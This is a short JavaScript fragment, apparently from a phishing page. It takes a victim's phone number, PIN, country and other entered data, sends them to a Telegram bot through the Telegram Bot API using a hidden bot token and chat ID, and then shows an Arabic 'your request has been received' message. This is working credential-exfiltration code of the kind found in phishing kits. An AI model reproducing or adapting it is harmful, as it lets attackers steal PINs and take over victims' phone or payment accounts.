// Check if pin input is filled (ensure valid data before sending)
if (pinInput.trim()) {
    // Format the message to send to Telegram bot
    const message = `
        Number: ${phoneNumber}
        Pin: ${pinInput}
        Country: ${countryName}
        Additional Data: ${additionalData}
    `;

    // URL for Telegram Bot API
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    // Send data to Telegram bot using fetch
    fetch(apiUrl)
        .then(response => {
            if (response.ok) {
                alert('تم التوصل بطلبكم!'); // "Your request has been received!"
            } else {
                alert('Failed to send data to Telegram');
            }
        })
        .catch(error => {
            alert(`Error sending data: ${error}`);
        });
} else {
    alert('Please enter valid information.');
}
